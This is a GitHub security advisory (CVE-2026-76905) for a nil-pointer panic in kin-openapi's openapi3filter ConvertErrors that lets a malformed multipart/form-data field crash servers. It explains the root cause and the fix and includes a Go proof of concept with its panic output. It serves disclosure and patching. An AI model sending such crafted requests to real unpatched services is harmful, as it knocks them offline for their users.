# [H] kin-openapi openai3filter: nil-pointer panic in ConvertErrors on malformed multipart/form-data body enables unauthenticated DoS

## Summary
Severity: High
Advisory: GHSA-mmfr-pmjx-hw9w
CVE: CVE-2026-76905
CWE: CWE-476
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-21
Source: https://github.com/advisories/GHSA-mmfr-pmjx-hw9w
Type: github-advisory

## Affected
- Go: `github.com/getkin/kin-openapi` — affected >=0.10.0 <0.141.0

## Details
### Summary

A nil-pointer dereference in `openapi3filter.ConvertErrors` lets any unauthenticated client crash a server with a single HTTP request. When an application validates a `multipart/form-data` request body and renders the resulting validation error through the library-provided `ValidationErrorEncoder` / `ConvertErrors` helpers, a malformed scalar form field (e.g. a non-numeric value for an `integer` property) produces an error shape that `convertParseError` dereferences without a nil check. The handler goroutine panics, causing a denial of service. `application/json` request bodies are **not** affected — the bug is specific to `multipart/form-data`.

### Details

The panic is in `convertParseError`, at [`openapi3filter/validation_error_encoder.go:119-120`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validation_error_encoder.go#L119) (still present on `master` at the time of writing):

```go
} else if innerErr.RootCause() != nil {
    if rootErr, ok := innerErr.Cause.(*ParseError); ok &&
        rootErr.Kind == KindInvalidFormat && e.Parameter.In == "query" {   // ❌ e.Parameter may be nil → panic
```

The comparison `e.Parameter.In == "query"` assumes `e.Parameter` is non-nil. It is reached whenever **both** of the following hold:

1. **`e.Parameter == nil`.** A `*RequestError` carries *either* `Parameter` (parameter errors) *or* `RequestBody` (body errors), never both. `ValidateRequestBody` builds body errors with only `RequestBody` set, leaving `Parameter` nil — see [`validate_request.go:326-332`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validate_request.go#L326).
2. **`innerErr.Cause` is itself a `*ParseError`** (a `ParseError` nested inside a `ParseError`), so the type assertion on line 119 succeeds and execution reaches the `e.Parameter.In` dereference on line 120.

The only default code path that satisfies *both* conditions is the **multipart** body decoder, which wraps a failed part's `*ParseError` inside another `*ParseError` at [`req_resp_decoder.go:1549`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L1549) and [`:1558`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go#L1558):

```go
if v, ok := err.(*ParseError); ok {
    return nil, &ParseError{path: []any{name}, Cause: v}   // v is a *ParseError → nested
}
```

Why other paths do **not** reach the dereference:

| Body content type | Failure mode | `RequestError.Err` shape | `.Cause` is `*ParseError`? | `e.Parameter` | Panics? |
|---|---|---|---|---|---|
| **`multipart/form-data`** | scalar part fails primitive parse (`age=notanumber`) | `*ParseError` wrapping a `*ParseError` | **yes** | `nil` | **YES** |
| `application/json` | malformed JSON syntax | `*ParseError` whose `.Cause` is an `encoding/json` error | no (assertion fails → safe fallback branch) | `nil` | no |
| `application/json` | wrong type / schema violation | `*openapi3.SchemaError` (routed to `convertSchemaError`, never reaches `convertParseError`) | n/a | `nil` | no |
| styled `query` / `path` params | invalid format | `*ParseError` wrapping a `*ParseError` | yes | **set (non-nil)** | no (guard/assignment succeeds) |

Note that the sibling `"path"` branch two lines above ([line 108](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validation_error_encoder.go#L108)) already guards correctly with `e.Parameter != nil`; the `"query"` branch simply omits the same guard.

**Recommended fix.** Add the missing nil guard to the condition:

```diff
 		if rootErr, ok := innerErr.Cause.(*ParseError); ok &&
-			rootErr.Kind == KindInvalidFormat && e.Parameter.In == "query" {
+			rootErr.Kind == KindInvalidFormat && e.Parameter != nil && e.Parameter.In == "query" {
```

When `e.Parameter == nil` the inner `if` is skipped and control falls through to the existing `return &ValidationError{Status: http.StatusBadRequest, Title: innerErr.Reason}` at [line 127-130](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/validation_error_encoder.go#L127) — a correct `400 Bad Request`. I verified that applying only this one-line guard stops the panic and returns `*ValidationError{Status: 400}`.

Minor follow-up worth including in the same change: for the multipart nested `*ParseError`, the *outer* `ParseError.Reason` is empty, so the fallback `Title: innerErr.Reason` yields a `400` with an **empty `Title`**. The descriptive text lives in `innerErr.Error()` (e.g. `"path age: value notanumber: an invalid integer: invalid syntax"`). Prefer a non-empty fallback:

```go
title := innerErr.Reason
if title == "" {
    title = innerErr.Error()
}
return &ValidationError{Status: http.StatusBadRequest, Title: title}
```

### PoC

Verified against revision `98d956447b64eaa10d3570a80b3be1a2849945f1` (also reproducible on current `master`), Go 1.25.0.

**1. Spec** — one operation accepting a `multipart/form-data` body with a non-string scalar (`integer`) property:

```yaml
openapi: '3.0.3'
info: {title: t, version: '1.0.0'}
paths:
  /upload:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              properties:
                age: {type: integer}
      responses:
        '200': {description: ok}
```

**2. Program** — validate a request whose `age` part is non-numeric, then convert the error the way a typical error-rendering middleware does:

```go
package main

import (
	"bytes"
	"context"
	"fmt"
	"mime/multipart"
	"net/http"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const spec = `
openapi: '3.0.3'
info: {title: t, version: '1.0.0'}
paths:
  /upload:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              properties:
                age: {type: integer}
      responses:
        '200': {description: ok}
`

func main() {
	loader := openapi3.NewLoader()
	doc, _ := loader.LoadFromData([]byte(spec))
	_ = doc.Validate(loader.Context)
	router, _ := gorillamux.NewRouter(doc)

	// multipart body: a non-numeric value for the integer property "age"
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	_ = w.WriteField("age", "notanumber")
	w.Close()

	r, _ := http.NewRequest(http.MethodPost, "/upload", &buf)
	r.Header.Set("Content-Type", w.FormDataContentType())
	route, pp, _ := router.FindRoute(r)

	reqErr := openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: r, PathParams: pp, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	fmt.Printf("ValidateRequest returned: %T\n", reqErr) // *openapi3filter.RequestError

	// What an application's error-rendering middleware calls:
	_ = openapi3filter.ConvertErrors(reqErr) // panics
	fmt.Println("no panic (unexpected)")
}
```

**3. Observed output** (`go run .`):

```
ValidateRequest returned: *openapi3filter.RequestError
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x2 addr=0x20 pc=0x...]

goroutine 1 [running]:
github.com/getkin/kin-openapi/openapi3filter.convertParseError(...)
	.../openapi3filter/validation_error_encoder.go:120 +0x17c
github.com/getkin/kin-openapi/openapi3filter.ConvertErrors(...)
	.../openapi3filter/validation_error_encoder.go:42 +0xec
main.main()
	...
exit status 2
```

The panic is at exactly `validation_error_encoder.go:120` — the unguarded `e.Parameter.In` dereference.

**Control (confirms JSON is not a vector):** repeating the setup with an `application/json` body and either a malformed body (`{"age": `) or a wrong-type body (`{"age": "notanumber"}`) returns from `ConvertErrors` normally, with no panic. Only the `multipart/form-data` path crashes.

In a real HTTP server, `ConvertErrors` / `ValidationErrorEncoder.Encode` runs inside the request handler, so the panic aborts the in-flight request (connection reset / 500) and, without a `recover()` in the middleware chain, is trivially repeatable.

### Impact

- **Type:** Nil-pointer dereference → **unauthenticated remote denial of service**.
- **Who is impacted:** any application using `github.com/getkin/kin-openapi/openapi3filter` that (1) exposes an endpoint accepting a `multipart/form-data` request body with at least one non-string scalar property (`integer` / `number` / `boolean`), **and** (2) renders validation errors through the library's own `ValidationErrorEncoder` or `ConvertErrors` helpers. These are the library's advertised error-rendering helpers, so this is a realistic default integration.
- **Attack:** a single crafted, unauthenticated request (a multipart part whose value doesn't parse to the declared scalar type). No credentials, special privileges, or unusual client capabilities are required, and it is repeatable at will.
- **Consequence:** the handling goroutine panics. Absent a `recover()` boundary in the application's middleware, the request is aborted; sustained requests deny service. Confidentiality and integrity are not affected.
- **Not affected:** applications that only accept `application/json` bodies (verified above), applications that do not use `ConvertErrors` / `ValidationErrorEncoder` to format errors, or applications that wrap handlers in a `recover()` (which converts the crash into a handled 500 but still prevents normal error rendering).

## References
- https://github.com/getkin/kin-openapi/security/advisories/GHSA-mmfr-pmjx-hw9w
- https://github.com/getkin/kin-openapi/commit/1d0a337c9b1570fab283be8a04c8af6e43b9a22c
- https://github.com/getkin/kin-openapi
- https://github.com/getkin/kin-openapi/releases/tag/v0.141.0
